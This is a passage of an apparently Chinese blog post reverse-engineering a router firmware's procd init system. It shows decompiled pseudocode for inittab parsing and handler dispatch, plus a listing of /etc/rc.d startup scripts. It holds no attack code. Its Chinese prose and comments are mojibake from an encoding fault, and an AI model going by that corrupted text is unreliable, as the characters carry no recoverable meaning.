r0</span></span><br><span class="line">  _DWORD *v18; <span class="comment">// r3</span></span><br><span class="line">  FILE *stream; <span class="comment">// [sp+8h] [bp-88h]</span></span><br><span class="line">  <span class="type">regmatch_t</span> v20[<span class="number">5</span>]; <span class="comment">// [sp+10h] [bp-80h] BYREF</span></span><br><span class="line">  <span class="type">regex_t</span> preg; <span class="comment">// [sp+38h] [bp-58h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v22[<span class="number">14</span>]; <span class="comment">// [sp+58h] [bp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  stream = <span class="built_in">fopen</span>(<span class="string">&quot;/etc/inittab&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">regcomp</span>(&amp;preg, <span class="string">&quot;([a-zA-Z0-9]*):([a-zA-Z0-9]*):([a-zA-Z0-9]*):(.*)&quot;</span>, <span class="number">1</span>);<span class="comment">// ç¼–è¾‘ä¸€ä¸ªæ­£åˆ™è¡¨è¾¾å¼</span></span><br><span class="line">    v0 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">    v1 = <span class="built_in">malloc</span>(<span class="number">0x64</span>u);</span><br><span class="line">    <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">LABEL_26:</span><br><span class="line">    <span class="keyword">while</span> ( <span class="built_in">fgets</span>(v0, <span class="number">128</span>, stream) )            <span class="comment">// è¯»å–</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">strlen</span>(v0);</span><br><span class="line">      v3 = &amp;v0[v2];</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (<span class="type">unsigned</span> __int8)*--v3;</span><br><span class="line">        <span class="keyword">if</span> ( (*(_WORD *)(_ctype_b + <span class="number">2</span> * v4) &amp; <span class="number">0x20</span>) == <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        --v2;</span><br><span class="line">      &#125;</span><br><span class="line">      v0[v2] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v0 != <span class="string">&#x27;#&#x27;</span> &amp;&amp; !<span class="built_in">regexec</span>(&amp;preg, v0, <span class="number">5u</span>, v20, <span class="number">0</span>) )<span class="comment">// å¿½ç•¥è¡Œé¦–ä¸º#</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Parsing inittab - %s&quot;</span>, v0);</span><br><span class="line">          <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Parsing inittab - %s&quot;</span>, <span class="string">&quot;procd_inittab&quot;</span>, <span class="number">274</span>, v0);</span><br><span class="line">        &#125;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        p_rm_eo = &amp;v20[<span class="number">0</span>].rm_eo;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = *p_rm_eo;</span><br><span class="line">          v8 = p_rm_eo[<span class="number">1</span>];</span><br><span class="line">          p_rm_eo += <span class="number">2</span>;</span><br><span class="line">          v0[v7] = <span class="number">0</span>;</span><br><span class="line">          v22[v5++] = (<span class="type">int</span>)&amp;v0[v8];             <span class="comment">// æå–å­—æ®µ</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v5 != <span class="number">4</span> );</span><br><span class="line">        v9 = v1;</span><br><span class="line">        v10 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="built_in">strtok</span>((<span class="type">char</span> *)v22[<span class="number">3</span>], <span class="string">&quot; &quot;</span>); ; i = <span class="built_in">strtok</span>(<span class="number">0</span>, <span class="string">&quot; &quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = (<span class="type">int</span>)i;</span><br><span class="line">          ++v9;</span><br><span class="line">          <span class="keyword">if</span> ( i )</span><br><span class="line">            v12 = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v10 &gt; <span class="number">6</span> )</span><br><span class="line">            v12 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v12 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v9[<span class="number">2</span>] = i;</span><br><span class="line">          ++v10;</span><br><span class="line">        &#125;</span><br><span class="line">        v13 = v22[<span class="number">0</span>];</span><br><span class="line">        v14 = (<span class="type">const</span> <span class="type">char</span> *)v22[<span class="number">2</span>];</span><br><span class="line">        v15 = <span class="number">0</span>;</span><br><span class="line">        v1[v10 + <span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        v1[<span class="number">2</span>] = v13;</span><br><span class="line">        v1[<span class="number">11</span>] = v0;</span><br><span class="line">        <span class="keyword">while</span> ( v15 != <span class="number">5</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = <span class="built_in">strcmp</span>((&amp;off_1AA58)[v16], v14); <span class="comment">// åŒ¹é…å­—æ®µ</span></span><br><span class="line">          v16 += <span class="number">3</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v17 )</span><br><span class="line">          &#123;</span><br><span class="line">            *v1 = &amp;off_1AA50;</span><br><span class="line">            v18 = off_1AA54;</span><br><span class="line">            off_1AA54 = v1;</span><br><span class="line">            v1[<span class="number">1</span>] = v18;</span><br><span class="line">            v1[<span class="number">12</span>] = &amp;(&amp;off_1AA58)[<span class="number">3</span> * v15];</span><br><span class="line">            *v18 = v1;</span><br><span class="line">            v0 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">            v1 = <span class="built_in">malloc</span>(<span class="number">0x64</span>u);</span><br><span class="line">            <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">          &#125;</span><br><span class="line">          ++v15;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Unknown init handler %s\n&quot;</span>, v14);</span><br><span class="line">        <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: Unknown init handler %s\n&quot;</span>, v14);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(stream);</span><br><span class="line">    <span class="built_in">free</span>(v0);</span><br><span class="line">    <span class="built_in">free</span>(v1);</span><br><span class="line">    <span class="built_in">regfree</span>(&amp;preg);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to open %s\n&quot;</span>, <span class="string">&quot;/etc/inittab&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: Failed to open %s\n&quot;</span>, <span class="string">&quot;/etc/inittab&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¯»å–&#x2F;etc&#x2F;inittabæ–‡ä»¶ï¼ŒåŒ¹é…æ ¼å¼ä¸º <code>identifier:runlevel:action:process</code> çš„è¡Œï¼Œä»¥å¤„ç†æœåŠ¡åˆå§‹åŒ–æ•°æ®</p><h5 id="etc-inittab"><a href="#etc-inittab" class="headerlink" title="&#x2F;etc&#x2F;inittab"></a>&#x2F;etc&#x2F;inittab</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (c) 2013 The Linux Foundation. All rights reserved.</span></span><br><span class="line">::sysinit:/etc/init.d/rcS S boot</span><br><span class="line">::shutdown:/etc/init.d/rcS K shutdown</span><br><span class="line">ttyHSL1::askfirst:/bin/login</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*v1 = &amp;off_1AA50;</span><br><span class="line">v18 = off_1AA54;</span><br><span class="line">off_1AA54 = v1;</span><br><span class="line">v1[<span class="number">1</span>] = v18;</span><br><span class="line">v1[<span class="number">12</span>] = &amp;(&amp;off_1AA58)[<span class="number">3</span> * v15];</span><br><span class="line">*v18 = v1;</span><br><span class="line">v0 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">v1 = <span class="built_in">malloc</span>(<span class="number">0x64</span>u);</span><br><span class="line"><span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line"><span class="keyword">goto</span> LABEL_26;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™éƒ¨åˆ†1AA50å·²ç„¶è¢«ä¿®æ”¹äº†</p><p>ä¹‹åæ‰§è¡Œ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sub_B3F4</span>(<span class="string">&quot;respawn&quot;</span>);</span><br><span class="line"><span class="built_in">sub_B3F4</span>(<span class="string">&quot;askconsole&quot;</span>);</span><br><span class="line"><span class="built_in">sub_B3F4</span>(<span class="string">&quot;askfirst&quot;</span>);</span><br><span class="line"><span class="built_in">sub_B3F4</span>(<span class="string">&quot;sysinit&quot;</span>);</span><br></pre></td></tr></table></figure><p>æƒ³æ¥ç®—æ˜¯åªä¼šæ‰§è¡Œæœ€åä¸€ä¸ªå‡½æ•°</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *__fastcall <span class="title">sub_B3F4</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">void</span> **i; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v3; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  v1 = s2;</span><br><span class="line">  <span class="keyword">for</span> ( i = (<span class="type">void</span> **)off_1AA50; i != &amp;off_1AA50; i = (<span class="type">void</span> **)*i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="type">const</span> <span class="type">char</span> **)i[<span class="number">12</span>];</span><br><span class="line">    s2 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">strcmp</span>(*v3, v1);</span><br><span class="line">    <span class="keyword">if</span> ( !s2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v3[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !v3[<span class="number">2</span>] )</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">const</span> <span class="type">char</span> *)((<span class="built_in">int</span> (__fastcall *)(<span class="type">void</span> **))v4)(i);</span><br><span class="line">      s2 = (<span class="type">const</span> <span class="type">char</span> *)((<span class="built_in">int</span> (__fastcall *)(<span class="type">void</span> **))v4)(i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> s2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œi[12]å³sub_B398ï¼ˆsysinitå¯¹åº”çš„å‡½æ•°ï¼‰</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_B398</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(_DWORD *)(a1 + <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">sub_BB80</span>(*(_DWORD *)(a1 + <span class="number">16</span>), v4, sub_B394, a4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;valid format is rcS &lt;S|K&gt; &lt;param&gt;\n&quot;</span>, a3);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fputs</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;word_1162A, (FILE *)stderr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_BB80</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">runqueue_init</span>((<span class="type">int</span>)&amp;unk_1ACD0);</span><br><span class="line">  dword_1AD04 = <span class="number">1</span>;</span><br><span class="line">  dword_1AD0C = a3;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_B730</span>((<span class="type">int</span>)&amp;unk_1ACD0, <span class="string">&quot;/etc/rc.d&quot;</span>, a1, (<span class="type">int</span>)<span class="string">&quot;*&quot;</span>, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§è‡´çš„ä½œç”¨å·®ä¸å¤šæ˜¯æ·»åŠ &#x2F;etc&#x2F;rc.d&#x2F;*ä¸‹çš„è„šæœ¬ä½œä¸ºtaskå¹¶æ‰§è¡Œ</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">~/fr/t/_TL-WAR2/squashfs-root/etc ------------------------------------------------------------------------------------------------------------------</span><br><span class="line">&gt; ls -all ./rc.d    </span><br><span class="line">æ€»ç”¨é‡ <span class="number">8</span></span><br><span class="line">drwxr-xr-x  <span class="number">2</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o <span class="number">4096</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> .</span><br><span class="line">drwxr-xr-x <span class="number">39</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o <span class="number">4096</span> <span class="number">12</span>æœˆ <span class="number">25</span> <span class="number">15</span>:<span class="number">44</span> ..</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> K20miniupnpd -&gt; ../init.d/miniupnpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> K26pppox -&gt; ../init.d/pppox</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> K50dropbear -&gt; ../init.d/dropbear</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> K80uac -&gt; ../init.d/uac</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> K81apdb_check -&gt; ../init.d/apdb_check</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> K90wireless -&gt; ../init.d/wireless</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> K98boot -&gt; ../init.d/boot</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> K99luci_monitor -&gt; ../init.d/luci_monitor</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> K99sys_ha -&gt; ../init.d/sys_ha</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> K99umount -&gt; ../init.d/umount</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S00sysfixtime -&gt; ../init.d/sysfixtime</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S01led_early -&gt; ../init.d/led_early</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S10boot -&gt; ../init.d/boot</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S10system -&gt; ../init.d/system</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S14tddpd -&gt; ../init.d/tddpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S15loggerd -&gt; ../init.d/loggerd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S15rsa_check -&gt; ../init.d/rsa_check</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S20network -&gt; ../init.d/network</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S21switch -&gt; ../init.d/<span class="keyword">switch</span></span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S25sysctl -&gt; ../init.d/sysctl</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">22</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S26time_setting -&gt; ../init.d/time_setting</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S31tmngtd -&gt; ../init.d/tmngtd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S40fstab -&gt; ../init.d/fstab</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S40watchdog -&gt; ../init.d/watchdog</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">17</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S42ipgroup -&gt; ../init.d/ipgroup</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S42ippool -&gt; ../init.d/ippool</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S45firewall -&gt; ../init.d/firewall</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S46nat -&gt; ../init.d/nat</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S47access_ctl -&gt; ../init.d/access_ctl</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">24</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S47administration -&gt; ../init.d/administration</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">21</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S47dos_defense -&gt; ../init.d/dos_defense</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">23</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S47flood_defense -&gt; ../init.d/flood_defense</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">13</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S47imb -&gt; ../init.d/imb</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S47mac_filter -&gt; ../init.d/mac_filter</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">14</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S50cron -&gt; ../init.d/cron</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S50dropbear -&gt; ../init.d/dropbear</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">15</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S50pppox -&gt; ../init.d/pppox</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">19</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S50pure-ftpd -&gt; ../init.d/pure-ftpd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S50queueventd -&gt; ../init.d/queueventd</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">16</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S50telnet -&gt; ../init.d/telnet</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S50wireless -&gt; ../init.d/wireless</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">20</span> <span class="number">6</span>æœˆ  <span class="number">26</span>  <span class="number">2019</span> S52qos-tplink -&gt; ../init.d/qos-tplink</span><br><span class="line">lrwxrwxrwx  <span class="number">1</span> s1nec<span class="number">-1</span>o s1nec<span class="number">-1</span>o   <span class="number">18</span> <span 